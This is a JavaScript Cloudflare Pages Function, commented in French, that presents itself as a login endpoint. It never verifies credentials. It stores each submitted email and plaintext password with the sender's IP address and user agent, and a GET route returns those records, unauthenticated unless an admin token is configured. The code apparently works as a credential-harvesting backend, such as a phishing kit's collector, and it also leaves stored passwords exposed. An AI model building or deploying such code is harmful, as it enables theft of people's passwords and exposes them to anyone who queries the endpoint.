// Cloudflare Pages Function: /api/login
// Documentation: https://developers.cloudflare.com/pages/functions/

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Token',
      'Cache-Control': 'no-store'
    }
  });
}

// GET /api/login?id=<id>
// Récupère un enregistrement depuis la KV LOGINS (si liée)
export async function onRequestGet({ request, env }) {
  const url = new URL(request.url);
  const id = url.searchParams.get('id');

  // Si un token admin est configuré, l'exiger
  const requiredToken = env?.ADMIN_TOKEN;
  if (requiredToken) {
    const provided = request.headers.get('X-Admin-Token');
    if (provided !== requiredToken) {
      return json({ success: false, message: 'Non autorisé' }, 401);
    }
  }

  if (!id) {
    return json({ success: false, message: 'Paramètre id manquant' }, 400);
  }

  if (!env || !env.LOGINS || typeof env.LOGINS.get !== 'function') {
    return json({ success: false, message: 'KV LOGINS non configurée' }, 500);
  }

  const raw = await env.LOGINS.get(id);
  if (!raw) {
    return json({ success: false, message: 'Aucun enregistrement trouvé pour cet id' }, 404);
  }

  let record;
  try { record = JSON.parse(raw); } catch { record = raw; }
  return json({ success: true, id, record });
}

export async function onRequestPost({ request, env }) {
  try {
    const contentType = request.headers.get('content-type') || '';
    if (!contentType.includes('application/json')) {
      return json({ success: false, message: 'Content-Type must be application/json' }, 415);
    }

    const body = await request.json().catch(() => null);
    const email = (body?.email || '').toString().trim();
    const password = (body?.password || '').toString();

    if (!email || !password) {
      return json({ success: false, message: 'Email et mot de passe requis' }, 400);
    }

    if (!/^([^\s@]+)@([^\s@]+)\.([^\s@]+)$/.test(email)) {
      return json({ success: false, message: "Format d'email invalide" }, 400);
    }

    // Métadonnées de requête
    const receivedAt = new Date().toISOString();
    const ip = request.headers.get('CF-Connecting-IP') || request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Générer un ID d'enregistrement
    const id = `login:${Date.now()}:${Math.random().toString(36).slice(2, 8)}`;

    // Si une KV LOGINS est liée, on enregistre en clair (à vos risques; non recommandé)
    try {
      if (env && env.LOGINS && typeof env.LOGINS.put === 'function') {
        const payload = { email, password, receivedAt, ip, userAgent };
        await env.LOGINS.put(id, JSON.stringify(payload));
      }
    } catch (err) {
      // On ne bloque pas la réponse si la KV échoue
      console.warn('KV put failed:', err);
    }

    // Réponse d'accusé de réception
    return json({
      success: true,
      message: 'Identifiants reçus',
      id,
      data: {
        email,
        passwordLength: password.length,
        receivedAt
      }
    });
  } catch (err) {
    return json({ success: false, message: 'Erreur serveur', error: err?.message || String(err) }, 500);
  }
}

function json(payload, status = 200) {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
      // Si votre front est sur un autre domaine, remplacez * par l'origine autorisée
      'Access-Control-Allow-Origin': '*'
    }
  });
}
